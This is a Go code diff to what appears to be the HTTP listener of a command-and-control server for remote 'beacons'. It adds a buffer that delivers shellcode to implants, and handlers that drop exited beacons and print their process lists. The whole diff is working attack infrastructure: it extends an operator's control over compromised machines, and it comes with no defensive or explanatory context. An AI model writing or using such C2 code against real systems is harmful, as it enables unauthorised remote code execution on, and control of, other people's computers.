@@ -130,12 +130,14 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 	respMap["exec"] = beacon.ExecBuffer
 	respMap["download"] = beacon.DownloadBuffer
 	respMap["upload"] = beacon.UploadBuffer
+	respMap["shellcode"] = beacon.ShellcodeBuffer
 	respMap["proxyclients"] = beacon.ProxyClientBuffer
 
 	json.NewEncoder(w).Encode(respMap)
 	beacon.ExecBuffer = nil
 	beacon.DownloadBuffer = nil
 	beacon.UploadBuffer = nil
+	beacon.ShellcodeBuffer = nil
 	beacon.ProxyClientBuffer = nil
 
 	if len(update.Data) > 0 {
@@ -150,6 +152,25 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 			} else if(decodedData[0] == '0') {
 				fmt.Println("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
 			}
+		} else if update.Type == "quit" {
+			idx := -1
+			for i := 0; i < len(beacons); i++ {
+				if beacon == beacons[i] {
+					idx = i
+					fmt.Println("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " has exited")
+					if activeBeacon == beacon {
+						activeBeacon = nil
+					}
+					break
+				}
+			}
+			if idx != -1 {
+				beacons = append(beacons[:idx], beacons[idx+1:]...)
+			}
+		} else if update.Type == "plist" {
+			fmt.Println("[+] Beacon " + beacon.Id + "@" + beacon.Ip + " process list:")
+			data, _ := b64.StdEncoding.DecodeString(update.Data)
+			fmt.Println(string(data))
 		}
 		prompt()
 	}
